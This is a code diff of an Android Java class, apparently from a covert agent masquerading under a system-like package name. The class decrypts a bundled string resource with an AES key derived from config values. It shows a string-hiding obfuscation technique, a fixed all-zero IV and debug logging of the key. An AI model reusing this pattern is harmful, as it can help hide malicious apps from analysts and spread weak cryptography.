@@ -22,7 +22,73 @@ import com.android.networking.util.Check;
 
 public class MessagesDecrypt {
 	private static final String TAG = "MessageDecrypt";
-	
+
+	final HashMap<String, String> messages = new HashMap<String, String>();
+
+	public MessagesDecrypt(Context context) {
+
+		if (Cfg.DEBUG) {
+			Check.asserts(context != null, " (init) Assert failed");
+		}
+
+		try {
+
+			final Resources resources = context.getResources();
+			final InputStream stream = resources.openRawResource(R.raw.messages);
+
+			// long p = 6502353731424260395L; //0x5A3D00448D7A912B;
+			// String sp = Long.toString(p, 16);
+
+			// SecretKey key = produceKey("0x" + sp.toUpperCase());
+			final SecretKey key = produceKey(Cfg.RNDMSG);
+
+			if (Cfg.DEBUG) {
+				Check.asserts(key != null, "null key"); //$NON-NLS-1$
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (init): stream=" + stream.available());
+				Check.log(TAG + " (init): key=" + ByteArray.byteArrayToHex(key.getEncoded()));
+			}
+
+			final Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding"); //$NON-NLS-1$
+			final byte[] iv = new byte[16];
+			Arrays.fill(iv, (byte) 0);
+			final IvParameterSpec ivSpec = new IvParameterSpec(iv);
+
+			cipher.init(Cipher.DECRYPT_MODE, key, ivSpec);
+			final CipherInputStream cis = new CipherInputStream(stream, cipher);
+
+			final BufferedReader br = new BufferedReader(new InputStreamReader(cis));
+
+			while (true) {
+				final String line = br.readLine();
+				if (line == null) {
+					break;
+				}
+
+				final String[] kv = line.split("="); //$NON-NLS-1$
+				if (Cfg.DEBUG) {
+					Check.asserts(kv.length == 2, "wrong number of tokens"); //$NON-NLS-1$
+					//Check.log(TAG + " " + kv[0] + " " + kv[1]); //$NON-NLS-1$ //$NON-NLS-2$
+				}
+
+				messages.put(kv[0], kv[1]);
+
+				if (Cfg.DEBUG) {
+					Check.asserts(messages.containsKey(kv[0]), "strange hashmap behaviour"); //$NON-NLS-1$
+				}
+			}
+
+		} catch (final Exception ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
+
+		}
+
+	}
+
 	public static SecretKey produceKey(String key) {
 
 		try {
@@ -30,9 +96,9 @@ public class MessagesDecrypt {
 				Check.log(" key: " + key + " " + key.length()); //$NON-NLS-1$
 			}
 
-			String salt = Cfg.RANDOM;
+			final String salt = Cfg.RANDOM;
 
-			MessageDigest digest = MessageDigest.getInstance("SHA-1");
+			final MessageDigest digest = MessageDigest.getInstance("SHA-1");
 
 			for (int i = 0; i < 128; i++) {
 				digest.update(salt.getBytes());
@@ -40,18 +106,18 @@ public class MessagesDecrypt {
 				digest.update(digest.digest());
 			}
 
-			byte[] sha1 = digest.digest();
+			final byte[] sha1 = digest.digest();
 
-			byte[] aes_key = new byte[16];
+			final byte[] aes_key = new byte[16];
 			System.arraycopy(sha1, 0, aes_key, 0, aes_key.length);
 
-			SecretKey secret = new SecretKeySpec(aes_key, "AES");
+			final SecretKey secret = new SecretKeySpec(aes_key, "AES");
 			if (Cfg.DEBUG) {
 				Check.log(" produced key: " + ByteArray.byteArrayToHex(aes_key)); //$NON-NLS-1$
 			}
 
 			return secret;
-		} catch (Exception e) {
+		} catch (final Exception e) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e);
 			}
@@ -65,73 +131,7 @@ public class MessagesDecrypt {
 
 	}
 
-	public synchronized static HashMap<String, String> init(Context context) {
-
-		HashMap<String, String> messages = new HashMap<String, String>();
-		
-		if (Cfg.DEBUG) {
-			Check.asserts(context != null, " (init) Assert failed");
-		}
-
-		try {
-			
-			Resources resources = context.getResources();
-			InputStream stream = resources.openRawResource(R.raw.messages);
-
-			//long p = 6502353731424260395L; //0x5A3D00448D7A912B;
-            //String sp = Long.toString(p, 16);
-            
-            //SecretKey key = produceKey("0x" + sp.toUpperCase());
-			SecretKey key = produceKey(Cfg.RNDMSG);
-			
-
-			if (Cfg.DEBUG) {
-				Check.asserts(key != null, "null key"); //$NON-NLS-1$
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (init): stream=" + stream.available());
-				Check.log(TAG + " (init): key=" + ByteArray.byteArrayToHex(key.getEncoded()));
-			}
-
-			Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding"); //$NON-NLS-1$
-			final byte[] iv = new byte[16];
-			Arrays.fill(iv, (byte) 0);
-			IvParameterSpec ivSpec = new IvParameterSpec(iv);
-
-			cipher.init(Cipher.DECRYPT_MODE, key, ivSpec);
-			CipherInputStream cis = new CipherInputStream(stream, cipher);
-
-			BufferedReader br = new BufferedReader(new InputStreamReader(cis));
-
-			while (true) {
-				String line = br.readLine();
-				if (line == null) {
-					break;
-				}
-
-				String[] kv = line.split("="); //$NON-NLS-1$
-				if (Cfg.DEBUG) {
-					Check.asserts(kv.length == 2, "wrong number of tokens"); //$NON-NLS-1$
-					//Check.log(TAG + " " + kv[0] + " " + kv[1]); //$NON-NLS-1$ //$NON-NLS-2$
-				}
-
-				messages.put(kv[0], kv[1]);
-
-				if (Cfg.DEBUG) {
-					Check.asserts(messages.containsKey(kv[0]), "strange hashmap behaviour"); //$NON-NLS-1$
-				}
-			}
-
-			
-		} catch (Exception ex) {
-			if (Cfg.EXCEPTION) {
-				Check.log(ex);
-			}
-
-			return null;
-		}
+	public HashMap<String, String> getMessages() {
 		return messages;
-
 	}
 }
